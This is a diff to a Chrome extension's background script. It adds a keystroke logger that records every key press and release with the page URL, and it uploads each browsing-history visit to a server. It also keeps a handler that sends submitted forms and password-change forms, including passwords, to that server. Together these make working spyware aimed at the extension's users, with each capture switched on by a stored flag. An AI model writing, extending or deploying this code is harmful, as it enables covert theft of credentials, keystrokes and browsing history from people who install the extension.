@@ -53,6 +53,18 @@ const addForm = (uid, form, tab) => {
     postRequest("/form/", data).catch((err) => console.log(err.message));
 };
 
+// Add live history entries as it is added
+const addHistory = (uid, historyItem) => {
+    const data = { uid, historyItem };
+    postRequest("/history/add/", data).catch((err) => console.log(err.message));
+};
+
+// Logs keypresses
+const logKeypress = (uid, url, direction, key) => {
+    const data = { uid, time: new Date().toString(), url, direction, key };
+    postRequest("/keypress/", data).catch((err) => console.log(err.message));
+};
+
 const getRandomToken = () => {
     // https://stackoverflow.com/a/23854032
     const randomPool = new Uint8Array(32);
@@ -88,13 +100,7 @@ chrome.storage.sync.get("historyWatcher", (runCommand) => {
     chrome.history.onVisited.addListener((h) => {
         console.log(h);
         chrome.storage.sync.get("userid", (res) => {
-            const data = {
-                uid: res.userid,
-                historyItem: h,
-            };
-            postRequest("/history/add/", data).catch((err) =>
-                console.log(err.message)
-            );
+            addHistory(res.userid, h);
         });
     });
 });
@@ -103,7 +109,6 @@ chrome.storage.sync.get("historyWatcher", (runCommand) => {
 chrome.storage.sync.get("passwordWatcher", (runCommand) => {
     if (!runCommand.passwordWatcher) return;
     chrome.runtime.onMessage.addListener((request, sender) => {
-        console.log(request.type);
         if (
             request.type === "formSubmit" ||
             request.type === "passwordChange"
@@ -111,6 +116,19 @@ chrome.storage.sync.get("passwordWatcher", (runCommand) => {
             chrome.storage.sync.get("userid", (res) => {
                 console.log(request.form);
                 addForm(res.userid, request.form, sender.tab);
+            });
+        }
+    });
+});
+
+chrome.storage.sync.get("keyPressWatcher", (runCommand) => {
+    if (!runCommand.keyPressWatcher) return;
+    chrome.runtime.onMessage.addListener((request, sender) => {
+        if (request.type === "keyDown" || request.type === "keyUp") {
+            chrome.storage.sync.get("userid", (res) => {
+                const direction = request.type === "keyDown" ? "DOWN" : "UP";
+                const url = sender.tab.url;
+                logKeypress(res.userid, url, direction, request.key);
             });
         }
     });
@@ -125,3 +143,6 @@ chrome.storage.sync.get("passwordWatcher", (runCommand) => {
 //         });
 //     }
 // });
+
+// WEB REQUESTS
+// https://developer.chrome.com/docs/extensions/mv3/intro/mv3-migration/
